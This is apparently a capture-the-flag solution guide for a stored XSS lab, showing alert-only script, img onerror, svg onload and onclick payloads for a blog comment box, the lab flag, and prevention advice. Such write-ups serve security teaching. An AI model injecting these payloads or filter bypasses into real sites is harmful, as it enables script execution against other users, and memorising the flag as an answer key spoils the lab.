# Solution Guide: Stored XSS Lab

## Lab Objective
Submit a comment that calls the `alert` function when the blog post is viewed.

## Vulnerability Analysis
The comment functionality in `blog_post.php` stores user input directly without any sanitization or encoding. When comments are displayed, they are inserted directly into the HTML without proper escaping, making it vulnerable to stored XSS attacks.

## Solution Steps

1. Navigate to the blog post page (`blog_post.php`)
2. Enter the following payload in the comment box:
   ```
   <script>alert('XSS')</script>
   ```
3. Submit the comment
4. The JavaScript code will be stored and executed when the page is viewed again
5. The flag `IDS{1c8a5c15517d898e873a11dd32a19fa4}` is available

## Alternative Solutions

If the `<script>` tag is filtered, you can try:

1. Image tag with onerror event:
   ```
   <img src=x onerror=alert('XSS')>
   ```

2. SVG element with onload event:
   ```
   <svg onload=alert('XSS')>
   ```

3. Using event handlers:
   ```
   <div onclick=alert('XSS') style="width:100px;height:100px;">Click me</div>
   ```

## Understanding Stored XSS vs Reflected XSS

- **Reflected XSS**: The malicious script is executed immediately in the same request/response cycle
- **Stored XSS**: The malicious script is stored on the server and executed when other users view the affected page

## Flag
The flag for this lab is: `IDS{1c8a5c15517d898e873a11dd32a19fa4}`

## Prevention

To prevent this vulnerability, the application should:
1. Sanitize user input before storing it
2. Encode special characters when displaying user-generated content
3. Implement Content Security Policy (CSP)
4. Use proper output encoding based on context